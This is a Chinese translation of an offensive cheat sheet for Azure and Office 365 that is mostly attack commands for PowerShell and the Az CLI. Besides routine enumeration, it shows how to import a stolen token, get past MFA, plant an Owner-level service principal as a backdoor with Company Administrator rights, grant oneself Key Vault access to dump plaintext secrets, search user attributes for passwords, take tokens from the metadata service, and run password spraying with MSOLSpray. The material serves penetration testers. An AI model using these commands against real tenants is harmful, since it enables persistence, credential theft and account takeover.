# Microsoft Azure & O365 CLI 工具备忘单

> 原文：<https://infosecwriteups.com/microsoft-azure-o365-cli-tool-cheatsheet-505469579584?source=collection_archive---------1----------------------->

![](img/4477861f910fa4ad43c34f4edecc67cf.png)

Unsplash.com

# 侦察

获取目标域的联盟信息

```
[https://login.microsoftonline.com/getuserrealm.srf?login=username@targetdomain.com&xml=1](https://login.microsoftonline.com/getuserrealm.srf?login=username@targetdomain.com&xml=1)
```

获取目标域的租户 ID

```
https://login.microsoftonline.com/<target domain>/v2.0/.well-known/openid-configuration
```

# Az PowerShell 模块

```
Import-Module Az
```

## 证明

```
Connect-AzAccount## Or this way sometimes gets around MFA restrictions$credential = Get-Credential
Connect-AzAccount -Credential $credential
```

导入上下文文件

```
Import-AzContext -Profile 'C:\Temp\Live Tokens\StolenToken.json'
```

导出上下文文件

```
Save-AzContext -Path C:\Temp\AzureAccessToken.json
```

## 账户信息

列出当前可用的 Azure 上下文

```
Get-AzContext -ListAvailable
```

获取上下文详细信息

```
$context = Get-AzContext
$context.Name
$context.Account
```

列表订阅

```
Get-AzSubscription
```

选择订阅

```
Select-AzSubscription -SubscriptionID "SubscriptionID"
```

获取当前用户的角色分配

```
Get-AzRoleAssignment
```

列出所有资源和资源组

```
Get-AzResource
Get-AzResourceGroup
```

列出存储帐户

```
Get-AzStorageAccount
```

## web 应用程序和 SQL

列出 Azure web 应用程序

```
Get-AzAdApplication
Get-AzWebApp
```

列出 SQL 服务器

```
Get-AzSQLServer
```

可以列出单个数据库以及从上一个命令中检索到的信息

```
Get-AzSqlDatabase -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

列出 SQL 防火墙规则

```
Get-AzSqlServerFirewallRule –ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

列出 SQL Server 管理员

```
Get-AzSqlServerActiveDirectoryAdminstrator -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

## 运行手册

列出 Azure 运行手册

```
Get-AzAutomationAccount
Get-AzAutomationRunbook -AutomationAccountName <AutomationAccountName> -ResourceGroupName <ResourceGroupName>
```

使用以下内容导出操作手册:

```
Export-AzAutomationRunbook -AutomationAccountName $AccountName -ResourceGroupName $ResourceGroupName -Name $RunbookName -OutputFolder .\Desktop\
```

## 虚拟机

列出虚拟机并获取操作系统详细信息

```
Get-AzVM
$vm = Get-AzVM -Name "VM Name" 
$vm.OSProfile
```

在虚拟机上运行命令

```
Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

## 建立工作关系网

列出虚拟网络

```
Get-AzVirtualNetwork
```

列出分配给虚拟网卡的公共 IP 地址

```
Get-AzPublicIpAddress
```

获取 Azure ExpressRoute (VPN)信息

```
Get-AzExpressRouteCircuit
```

获取 Azure VPN 信息

```
Get-AzVpnConnection
```

## 后门

创建一个新的 Azure 服务主体作为后门

```
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
#Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
```

# MSOnline PowerShell 模块

```
Import-Module MSOnline
```

## 证明

```
Connect-MsolService## Or this way sometimes gets around MFA restrictions$credential = Get-Credential
Connect-MsolService -Credential $credential
```

## 帐户和目录信息

列出公司信息

```
Get-MSolCompanyInformation
```

列出所有用户

```
Get-MSolUser -All
```

列出所有组

```
Get-MSolGroup -All
```

列出组成员(在本例中为全局管理员)

```
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember –GroupObjectId $GUID
```

列出所有用户属性

```
Get-MSolUser –All | fl
```

列出服务主体

```
Get-MsolServicePrincipal
```

在所有 Azure AD 用户属性中搜索密码的一行程序

```
$users = Get-MsolUser; foreach($user in $users){$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like "*password*"){Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)}}}
```

# Az CLI 工具

## 证明

```
az login
```

## 转储 Azure 密钥库

列出当前帐户可以查看的任何密钥保管库资源

```
az keyvault list –query '[].name' --output tsv
```

有了贡献者级别的访问权限，您可以给自己获得机密的适当权限。

```
az keyvault set-policy --name <KeyVaultname> --upn <YourContributorUsername> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
```

让 URI 负责钥匙库

```
az keyvault secret list --vault-name <KeyVaultName> --query '[].id' --output tsv
```

从 keyvault 获取明文秘密

```
az keyvault secret show --id <URI from last command> | ConvertFrom-Json
```

# 元数据服务 URL

```
[http://169.254.169.254/metadata](http://169.254.169.254/metadata)
```

从元数据服务获取访问令牌

```
GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' HTTP/1.1 Metadata: true
```

# 其他 Azure 和 O365 工具

## 下击暴流

Azure 安全评估工具

[https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)

寻找开放的存储 blobs

```
Invoke-EnumerateAzureBlobs -Base $BaseName
```

导出 SSL/TLS 证书

```
Get-AzPasswords -ExportCerts Y
```

Azure 容器注册表转储

```
Get-AzPasswords
Get-AzACR
```

## PowerZure

Azure 安全评估工具

https://github.com/hausec/PowerZure

## 道路工具

与 Azure AD 交互的框架

【https://github.com/dirkjanm/ROADtools 

## 风暴观察者

用于绘制 Azure 和 Azure AD 对象的 Red team 工具

[https://github.com/Azure/Stormspotter](https://github.com/Azure/Stormspotter)

## MSOLSpray

密码喷射工具 Azure/O365

[https://github.com/dafthack](https://github.com/dafthack)

```
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020
```